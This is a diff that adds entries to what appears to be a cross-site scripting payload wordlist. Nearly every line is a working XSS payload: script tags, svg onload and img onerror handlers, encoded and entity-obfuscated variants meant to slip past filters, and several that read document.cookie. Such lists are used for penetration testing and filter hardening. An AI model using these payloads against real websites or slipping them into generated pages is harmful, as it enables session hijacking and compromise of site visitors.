@@ -53,6 +53,22 @@ javascript://%250Aalert(1)
 <--`<img%2fsrc%3d` onerror%3dalert(document.domain)> --!>
 "><--<img+src= "><svg/onload+alert(document.domain)>> --!>
 <svg/onload={alert`1`}>
+"><script>alert(1)</script>
+ <svg/onload=prompt(1)
+ <svg><script>prompt&#40;1)</script>
+ --!><script>alert(1)</script>
+http://prompt.ml/js/test.js
+"type=image src onerror
+"prompt(1)
+<script> -> <svg> <img> <onmouse> 
+<svg/onload=alert(1);
+<article>hELLO</article>
+<svg/onload=alert(1);
+<p> Hello </p>
+<svg><script>prompt&#40;1)</script>
+<script>alert('hacked_by_yash')</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=prompt(document.cookie)>
 <a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>
 "><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
 "><onx=[] onmouseover=prompt(1)>
